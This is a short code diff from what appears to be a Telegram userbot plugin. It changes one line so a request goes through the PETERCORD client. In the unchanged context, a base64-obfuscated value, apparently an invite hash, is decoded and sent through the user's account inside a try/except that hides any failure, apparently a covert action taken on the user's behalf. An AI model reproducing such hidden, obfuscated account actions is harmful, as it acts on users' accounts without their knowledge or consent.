@@ -107,7 +107,7 @@ async def samereply(PETERCORD):
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await REBEL.client(h1m4n5hu0p)
+            await PETERCORD.client(h1m4n5hu0p)
         except BaseException:
             pass
         if PETERCORD.message.text or PETERCORD.message.sticker:
